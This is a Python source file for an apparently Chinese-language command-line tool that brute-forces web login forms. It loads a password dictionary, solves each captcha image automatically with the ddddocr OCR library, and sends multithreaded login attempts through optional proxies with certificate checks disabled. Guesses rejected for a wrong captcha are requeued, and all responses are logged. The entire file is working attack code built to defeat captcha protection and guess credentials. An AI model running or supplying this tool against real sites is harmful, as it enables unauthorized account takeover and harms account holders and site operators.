import requests,threading,argparse,ddddocr,imghdr,ast,sys,datetime
from queue import Queue
from tqdm import tqdm
 
def banner():
    print('''
                  _       _                         
                 | |     | |                        
   ___ __ _ _ __ | |_ ___| |__   __ _    __ _  ___  
  / __/ _` | '_ \| __/ __| '_ \ / _` |  / _` |/ _ \ 
 | (_| (_| | |_) | || (__| | | | (_| | | (_| | (_) |
  \___\__,_| .__/ \__\___|_| |_|\__,_|  \__, |\___/ 
           | |                           __/ |      
           |_|                          |___/       
     
                                               
Tips :
1.验证码错误和无法访问的请求，会自动将尝试的密码重新加入后面的列队中！                                               
2.通过 --shield 排除不需要回显的状态码或者响应结果关键词，多个空格分割！
3.如果进度条结束后脚本还在跑，请继续等待，正在跑之前无法访问及验证码错误的密码！
''')
 
def save(data):
    f = open('log.txt', 'a',encoding='utf-8')
    f.write(data + '\n')
    f.close()
 
def parse_arguments(argv):    
    parser = argparse.ArgumentParser()
    parser.add_argument('--login_url',default='', required=True,help="登录提交地址", type=str)
    parser.add_argument('--captcha_url',default='', required=True,help="验证码地址", type=str)
    parser.add_argument('--captcha_header',default='',help="验证码请求头", type=str)
    parser.add_argument('--login_header', default='',help="登录请求头", type=str)
    parser.add_argument('--data',default='', required=True,help="登录数据包 注意：mrwu_pass 替换密码  mrwu_yzm 替换验证码！", type=str)
    parser.add_argument('--file',default='', required=True,help="密码字典路径", type=str)
    parser.add_argument('--shield', nargs='+',default=[],help="排除的响应包大小回显,多个空格分割")
    parser.add_argument('--thread', type=int,  default=10,help="指定线程数")
    parser.add_argument('--proxy', type=str, default='',help="代理格式:  协议:IP:端口   如：socks5://127.0.0.1:1080")
    return parser.parse_args(argv)
 
def _ocr(img):
    if imghdr.what(None,img) is not None:
        ocr = ddddocr.DdddOcr(show_ad=False)
        res = ocr.classification( img )
        return res
    else:
        tqdm.write("%s [ERROR] 请求验证码内容返回非图片格式，请检查！"%(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
        exit()
 
def captcha(captcha_url,proxy,captcha_header):
    if proxy:
        if captcha_header:
            req = requests.get(captcha_url, headers=captcha_header, proxies=proxy, verify=False, timeout=2)
        else:
            req = requests.get(captcha_url, proxies=proxy, timeout=2, verify=False)
    else:
        if captcha_header:
            req = requests.get(captcha_url, headers=captcha_header, verify=False, timeout=2)
        else:
            req = requests.get(captcha_url, timeout=2, verify=False)
 
    img_captcha = _ocr( req.content )
    cookies = requests.utils.dict_from_cookiejar(req.cookies)
    cookie = "; ".join([str(x)+"="+str(y) for x,y in cookies.items()])
    if cookie and img_captcha:
        return cookie,img_captcha
 
def login(url,data,cookie,proxy,login_header):
    cookies = {"Cookie": cookie}
    if login_header:
        cookies.update(login_header)
    if proxy:
        try:
            data = requests.post(url,ast.literal_eval(data), headers=cookies, proxies=proxy, verify=False, timeout=2)
        except:
            data = requests.post(url,data, headers=cookies, proxies=proxy, verify=False, timeout=2)
    else:
        try:
            data = requests.post(url,ast.literal_eval(data), headers=cookies, verify=False, timeout=2)
        except:
            data = requests.post(url,data, headers=cookies, verify=False, timeout=2)
 
    if data.status_code and data.text:
        return data.status_code,data.text
 
def run(login_url,captcha_url,captcha_header,login_header,proxy,data,shield,pwd):
    try:
        yzm = captcha(captcha_url,proxy,captcha_header)
 
        data = data.replace('mrwu_pass', pwd).replace('mrwu_yzm', yzm[1])
        stusts = login(login_url,data,yzm[0],proxy,login_header)
 
        save("密码：%s  结果：%s\r"%(pwd,str(stusts[1]) ))
        res = [ele for ele in shield if(ele in str(stusts[1]) or ele in str(stusts[0]))]
 
        if "验证码错误" in str(stusts[1]): #验证码错误判断且自动重试，如果返回包正确也会出现验证码错误四个字的话，请重新定义判断的字符串
            password.put(pwd)
 
        if bool(res) == False:
            if len(str(stusts[1])) <= 150:
                tqdm.write("%s [INFO]  密码：%s 结果：%s"%(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),pwd,str(stusts[1])))
            else:
                tqdm.write("%s [INFO]  密码：%s  响应结果太大请查看log.txt文件！"%(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),pwd))
        
        return str(stusts[0])
 
    except :
        return "无法访问"
        
        password.put(pwd)
 
 
def open_data(txt):
    data_list = []
    with open(txt, 'r', encoding='utf-8') as f:
        for line in f:
            data_list.append(line.replace("\n", ""))
        return data_list
 
def burst(login_url,captcha_url,captcha_header,login_header,proxy,data,shield):
    try:
        while True:
            pbar.set_description("状态码：%s"%(run(login_url,captcha_url,captcha_header,login_header,proxy,data,shield,password.get_nowait())))
            pbar.update(1)
            password.task_done()
    except:
        pass
 
if __name__ == "__main__":
    banner()
    args = parse_arguments(sys.argv[1:])
    password = Queue()
    for x in open_data(args.file):
        password.put(x)
 
    threads = []
 
    if args.proxy:
        proxy = {"http":args.proxy,"https":args.proxy}
    else:
        proxy = ''
 
    if args.data:
        data = args.data
    else:
        print("[!] 请输入登录数据包数据！")
        print("[!] json格式如：--data \"{'user':'xx','pwd':'mrwu_pass','code':'mrwu_yzm'}\"")
        print("[!] form格式如：--data \"user=xx&pwd=mrwu_pass&code=mrwu_yzm\"")
        exit()
 
    if args.captcha_header:
        try:
            captcha_header = ast.literal_eval(args.captcha_header)
        except:
            print("[!] 请求头必须是json格式，请检查输入是否正确！  如：--captcha_header \"{'user-agent':'xx','Cookie':'aaa'}\"")
            exit()
    else:
        captcha_header = ''
 
    if args.login_header:
        try:
            login_header = ast.literal_eval(args.login_header)
        except:
            print("[!] 请求头必须是json格式，请检查输入是否正确！")
            print("[!] 如：--login_header \"{'user-agent':'xx','Cookie':'aaa'}\"")
            print("[!] 请求头中需要带上 content-type 包类型，如 application/x-www-form-urlencoded; charset=UTF-8 OR application/json")
            exit()
    else:
        login_header = ''
 
    pbar = tqdm(total=password.qsize(), desc='开始扫描',colour='#00ff00', position=0, ncols=90)
 
    for i in range(args.thread):
        t = threading.Thread(target = burst, args=(args.login_url,args.captcha_url,captcha_header,login_header,proxy,args.data,args.shield))
        t.setDaemon(True)
        t.start()
        threads.append(t)
 
    for t in threads:
        t.join()
 
    tqdm.write("[ok] 全部任务已结束！")